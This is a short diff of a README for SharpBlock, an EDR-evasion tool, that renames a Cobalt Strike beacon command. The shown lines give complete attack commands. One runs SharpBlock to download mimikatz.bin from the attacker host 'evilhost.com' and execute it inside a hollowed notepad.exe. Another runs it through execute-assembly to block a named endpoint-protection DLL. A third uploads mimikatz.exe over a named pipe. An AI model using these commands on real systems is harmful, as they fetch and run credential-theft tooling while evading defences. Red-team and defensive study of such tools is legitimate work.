@@ -39,9 +39,9 @@ SharpBlock -e http://evilhost.com/mimikatz.bin -s c:\windows\system32\notepad.ex
 
 ```
 execute-assembly SharpBlock.exe -e \\.\pipe\mimi -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
-upload-file /home/haxor/mimikatz.exe \\.\pipe\mimi
+upload_file /home/haxor/mimikatz.exe \\.\pipe\mimi
 ```
-*Note, for the `upload-file` beacon command, load upload.cna into Cobalt Strike's Script Manager*
+*Note, for the `upload_file` beacon command, load upload.cna into Cobalt Strike's Script Manager*
 
 
 
